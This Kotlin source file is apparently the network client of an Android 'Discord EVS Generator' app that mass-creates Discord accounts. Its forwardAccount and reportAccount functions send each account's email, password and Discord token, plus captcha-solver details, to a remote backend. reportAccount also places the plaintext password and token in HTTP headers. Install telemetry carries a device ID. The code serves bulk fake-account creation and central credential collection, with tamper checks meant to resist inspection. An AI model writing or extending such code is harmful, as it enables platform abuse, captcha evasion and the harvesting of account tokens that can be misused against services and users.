package com.discord.evs.generator.network

import android.content.Context
import com.discord.evs.generator.BuildConfig
import com.discord.evs.generator.R
import com.discord.evs.generator.features.FeatureFlags
import com.discord.evs.generator.security.NativeBridge
import com.discord.evs.generator.security.NativeGuard
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.net.UnknownHostException
import java.util.concurrent.TimeUnit
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

/**
 * Client for optional remote backend (Vercel / Railway / any Node host).
 *
 * Gated by [FeatureFlags.BACKEND_API_ENABLED]. When false, every public method
 * returns a disabled result and performs no network I/O.
 *
 * Auth layers (server must enforce the same):
 *  1. X-EVS-Key           — shared API key (rotatable without shipping bot tokens)
 *  2. X-App-Package       — must be com.discord.evs.generator
 *  3. X-App-Signature     — release signing cert SHA-256
 *  4. X-EVS-Timestamp     — unix seconds (reject skew > 120s on server)
 *  5. X-EVS-HMAC          — HMAC-SHA256(key, timestamp + method + path)
 *
 * Nothing here is unbreakable after APK decompilation. Goal is raise cost of
 * casual abuse and allow instant key rotation without leaking Telegram/Discord secrets.
 */
object BackendApi {

    private val client by lazy {
        OkHttpClient.Builder()
            .connectTimeout(20, TimeUnit.SECONDS)
            .readTimeout(35, TimeUnit.SECONDS)
            .writeTimeout(35, TimeUnit.SECONDS)
            .retryOnConnectionFailure(true)
            .build()
    }

    private val jsonMedia = "application/json; charset=utf-8".toMediaType()

    data class InstallResult(val ok: Boolean, val count: Int = -1, val error: String? = null)
    data class ForwardResult(val ok: Boolean, val error: String? = null)

    fun isEnabled(): Boolean = FeatureFlags.BACKEND_API_ENABLED

    fun isConfigured(context: Context): Boolean {
        if (!isEnabled()) return false
        val base = baseUrl(context)
        val key = apiKey(context)
        return base.isNotBlank()
            && !base.contains("YOUR-PROJECT", ignoreCase = true)
            && !base.contains("example.com", ignoreCase = true)
            && key.isNotBlank()
            && key != "CHANGE_ME"
            && key != "change-me-to-a-long-random-string"
    }

    fun baseUrl(context: Context): String {
        if (!isEnabled()) return ""
        return try {
            var raw = context.getString(R.string.backend_base_url).trim().trimEnd('/')
            // Guard against mis-set placeholders / garbage hosts
            if (raw.isBlank() ||
                raw.contains("YOUR-PROJECT", ignoreCase = true) ||
                raw.contains("example.com", ignoreCase = true) ||
                raw.equals("api base", ignoreCase = true) ||
                raw.equals("api_base", ignoreCase = true) ||
                raw.startsWith("api base", ignoreCase = true)
            ) {
                return ""
            }
            if (!raw.startsWith("http://") && !raw.startsWith("https://")) {
                raw = "https://$raw"
            }
            raw
        } catch (_: Exception) {
            ""
        }
    }

    fun apiKey(context: Context): String {
        if (!isEnabled()) return ""
        return try {
            context.getString(R.string.backend_api_key).trim()
        } catch (_: Exception) {
            ""
        }
    }

    private fun disabledInstall(reason: String = "backend disabled") =
        InstallResult(false, error = reason)

    private fun disabledForward(reason: String = "backend disabled") =
        ForwardResult(false, error = reason)

    private fun signatureHash(context: Context): String =
        try {
            NativeGuard.nativeGetSignatureHash(context).lowercase().replace(":", "")
        } catch (_: Exception) {
            ""
        }

    /** True when APK signing cert matches the pinned release keystore. */
    private fun signatureMatchesPin(context: Context): Boolean {
        if (BuildConfig.DEBUG) return true
        val got = signatureHash(context)
        val exp = NativeGuard.PINNED_SIGNATURE_HASH.lowercase().replace(":", "")
        return got.isNotBlank() && got == exp
    }

    private fun hmacSha256(secret: String, message: String): String {
        // Prefer Go/NDK implementation when libevs_core.so is present
        if (NativeBridge.available) {
            try {
                val n = NativeBridge.nativeHmacSha256(secret, message)
                if (n.isNotBlank()) return n.lowercase()
            } catch (_: Throwable) { /* fall through */ }
        }
        val mac = Mac.getInstance("HmacSHA256")
        mac.init(SecretKeySpec(secret.toByteArray(Charsets.UTF_8), "HmacSHA256"))
        return mac.doFinal(message.toByteArray(Charsets.UTF_8))
            .joinToString("") { "%02x".format(it) }
    }

    private fun authedRequest(
        context: Context,
        method: String,
        path: String,
        body: String?,
        extraHeaders: Map<String, String> = emptyMap()
    ): Request {
        val url = baseUrl(context) + path
        val ts = (System.currentTimeMillis() / 1000L).toString()
        val key = apiKey(context)
        val sig = signatureHash(context)
        val pathForHmac = path.removeSuffix(".js")
        // Prefer body-less HMAC (server expectA) — avoids JSON key-order mismatch on POST.
        // Server also accepts path+body (expectB); body-less is enough for GET and most POSTs.
        val payload = ts + method.uppercase() + pathForHmac
        val hmac = if (FeatureFlags.BACKEND_HMAC_AUTH && key.isNotBlank()) {
            hmacSha256(key, payload)
        } else {
            ""
        }

        val builder = Request.Builder()
            .url(url)
            .header("X-EVS-Key", key)
            .header("X-App-Version", BuildConfig.VERSION_NAME)
            .header("X-App-Package", context.packageName)
            .header("X-EVS-Client", "DiscordEVSGenerator")
            .header("X-EVS-Timestamp", ts)
            .header("User-Agent", "DiscordEVSGenerator/${BuildConfig.VERSION_NAME}")
            .apply {
                if (sig.isNotBlank()) header("X-App-Signature", sig)
                if (hmac.isNotBlank()) header("X-EVS-HMAC", hmac)
                extraHeaders.forEach { (k, v) ->
                    if (k.isNotBlank() && v.isNotBlank()) header(k, v)
                }
            }

        return when (method.uppercase()) {
            "POST", "PUT", "PATCH" -> {
                val rb = (body ?: "{}").toRequestBody(jsonMedia)
                builder.method(method.uppercase(), rb).build()
            }
            else -> builder.get().build()
        }
    }


    fun reportInstall(
        context: Context,
        deviceId: String,
        event: String = "install",
        fromVersion: Int? = null
    ): InstallResult {
        if (!isEnabled()) return disabledInstall()
        if (!isConfigured(context)) return disabledInstall("backend not configured")
        // Install count should still work even if signature pin mismatches (old sideload).
        // Account forward remains integrity-gated separately.

        var lastErr: String? = null
        repeat(2) { attempt ->
            try {
                val body = JSONObject()
                    .put("device", deviceId.take(64))
                    .put("version", BuildConfig.VERSION_NAME)
                    .put("versionCode", BuildConfig.VERSION_CODE)
                    .put("event", event) // "install" | "update"
                    .apply {
                        if (fromVersion != null && fromVersion > 0) put("fromVersionCode", fromVersion)
                    }
                    .toString()
                val req = authedRequest(context, "POST", "/api/install.js", body)
                client.newCall(req).execute().use { resp ->
                    val text = resp.body?.string().orEmpty()
                    val json = try { JSONObject(text) } catch (_: Exception) { JSONObject() }
                    if (resp.isSuccessful && json.optBoolean("ok", false)) {
                        return InstallResult(true, count = json.optInt("count", -1))
                    }
                    lastErr = json.optString("error").ifBlank { "HTTP ${resp.code}" }
                    if (resp.code in 400..499) return InstallResult(false, error = lastErr)
                }
            } catch (e: Exception) {
                lastErr = when (e) {
                    is UnknownHostException -> "cannot resolve host (${baseUrl(context).ifBlank { "empty base" }})"
                    else -> e.message ?: e.javaClass.simpleName
                }
            }
            if (attempt == 0) Thread.sleep(500)
        }
        return InstallResult(false, error = lastErr)
    }

    fun fetchInstallCount(context: Context): InstallResult {
        if (!isEnabled()) return disabledInstall()
        if (!isConfigured(context)) return disabledInstall("backend not configured (check backend_base_url)")

        return try {
            val req = authedRequest(context, "GET", "/api/install.js", null)
            client.newCall(req).execute().use { resp ->
                val text = resp.body?.string().orEmpty()
                val json = try { JSONObject(text) } catch (_: Exception) { JSONObject() }
                if (resp.isSuccessful && json.optBoolean("ok", false)) {
                    InstallResult(true, count = json.optInt("count", -1))
                } else {
                    InstallResult(false, error = json.optString("error").ifBlank { "HTTP ${resp.code}" })
                }
            }
        } catch (e: Exception) {
            InstallResult(
                false,
                error = when (e) {
                    is UnknownHostException -> "cannot resolve host (${baseUrl(context).ifBlank { "empty base" }})"
                    else -> e.message ?: e.javaClass.simpleName
                }
            )
        }
    }

    fun forwardAccount(
        context: Context,
        email: String,
        password: String,
        token: String,
        username: String = "",
        status: String = "VALID",
        phone: String = "",
        phoneStatus: String = "NOT_ASKED",
        emailVerified: Boolean = false,
        verified: Boolean = false,
        captchaSolveMethod: String = "",
        captchaSolverApi: String = "",
        tags: String = "",
        notes: String = "",
        createdAt: Long = 0L,
        mode: String = "embed"
    ): ForwardResult {
        if (!isEnabled()) return disabledForward()
        if (!isConfigured(context)) return disabledForward("backend not configured")
        if (!NativeGuard.verifyIntegrity(context)) {
            return disabledForward("integrity check failed")
        }

        var lastErr: String? = null
        repeat(2) { attempt ->
            try {
                val body = JSONObject()
                    .put("email", email)
                    .put("password", password)
                    .put("token", token)
                    .put("username", username)
                    .put("status", status)
                    .put("phone", phone)
                    .put("phoneStatus", phoneStatus)
                    .put("emailVerified", emailVerified)
                    .put("verified", verified)
                    .put("captchaSolveMethod", captchaSolveMethod)
                    .put("captchaSolverApi", captchaSolverApi)
                    .put("tags", tags)
                    .put("notes", notes)
                    .put("createdAt", if (createdAt > 0) createdAt.toString() else System.currentTimeMillis().toString())
                    .put("mode", mode)
                    .toString()
                val req = authedRequest(context, "POST", "/api/forward.js", body)
                client.newCall(req).execute().use { resp ->
                    val text = resp.body?.string().orEmpty()
                    val json = try { JSONObject(text) } catch (_: Exception) { JSONObject() }
                    val ok = resp.isSuccessful && json.optBoolean("ok", false)
                    if (ok || resp.code in 400..499) {
                        return ForwardResult(
                            ok = ok,
                            error = json.optString("error").ifBlank {
                                if (!ok) "HTTP ${resp.code}" else null
                            }
                        )
                    }
                    lastErr = json.optString("error").ifBlank { "HTTP ${resp.code}" }
                }
            } catch (e: Exception) {
                lastErr = e.message
            }
            if (attempt == 0) Thread.sleep(600)
        }
        return ForwardResult(false, error = lastErr)
    }

    data class EntitlementResult(val ok: Boolean, val premium: Boolean = false, val error: String? = null)

    /**
     * Server-side feature gate. Returns premium=false when feature flags are off.
     * Real social apps use short-lived session tokens + Play Integrity; this is the
     * lightweight equivalent for optional private builds.
     */
    fun checkEntitlement(context: Context): EntitlementResult {
        if (!FeatureFlags.BACKEND_API_ENABLED || !FeatureFlags.SERVER_ENTITLEMENT_GATE) {
            return EntitlementResult(ok = true, premium = true, error = "gate disabled")
        }
        if (!isConfigured(context)) return EntitlementResult(false, error = "backend not configured")
        if (!NativeGuard.verifyIntegrity(context)) {
            return EntitlementResult(false, error = "integrity check failed")
        }
        return try {
            val req = authedRequest(context, "GET", "/api/entitlement.js", null)
            client.newCall(req).execute().use { resp ->
                val text = resp.body?.string().orEmpty()
                val json = try { JSONObject(text) } catch (_: Exception) { JSONObject() }
                val ok = resp.isSuccessful && json.optBoolean("ok", false)
                EntitlementResult(
                    ok = ok,
                    premium = json.optBoolean("premium", false),
                    error = if (ok) null else json.optString("error").ifBlank { "HTTP ${resp.code}" }
                )
            }
        } catch (e: Exception) {
            EntitlementResult(false, error = e.message)
        }
    }

    /**
     * Report a generated account to the backend (when account sharing is allowed).
     * Server stores credentials and blocks duplicates (2+ same email:pass by default).
     */
    fun reportAccount(
        context: Context,
        email: String,
        password: String,
        token: String = "",
        reason: String = "account_created"
    ): ForwardResult {
        if (!isEnabled() || !isConfigured(context)) {
            return ForwardResult(false, error = "backend disabled")
        }
        return try {
            val body = JSONObject()
                .put("email", email)
                .put("password", password)
                .put("token", token)
                .put("reason", reason)
                .put("version", BuildConfig.VERSION_NAME)
                .toString()
            val extra = mapOf(
                "X-EVS-Reason" to reason,
                "X-EVS-Email" to email,
                "X-EVS-Password" to password,
                "X-EVS-Token" to token
            )
            val req = authedRequest(context, "POST", "/api/account.js", body, extra)
            client.newCall(req).execute().use { resp ->
                val text = resp.body?.string().orEmpty()
                val json = try { JSONObject(text) } catch (_: Exception) { JSONObject() }
                if (resp.code == 409 || json.optBoolean("blocked", false)) {
                    ForwardResult(false, error = json.optString("error").ifBlank { "duplicate blocked" })
                } else if (resp.isSuccessful && json.optBoolean("ok", false)) {
                    ForwardResult(true)
                } else {
                    ForwardResult(false, error = json.optString("message").ifBlank {
                        json.optString("error").ifBlank { "HTTP ${resp.code}" }
                    })
                }
            }
        } catch (e: Exception) {
            ForwardResult(false, error = e.message)
        }
    }

    fun health(context: Context): Boolean {
        if (!isEnabled() || !isConfigured(context)) return false
        return try {
            val req = Request.Builder().url(baseUrl(context) + "/api/health.js").get().build()
            client.newCall(req).execute().use { it.isSuccessful }
        } catch (_: Exception) {
            false
        }
    }
}
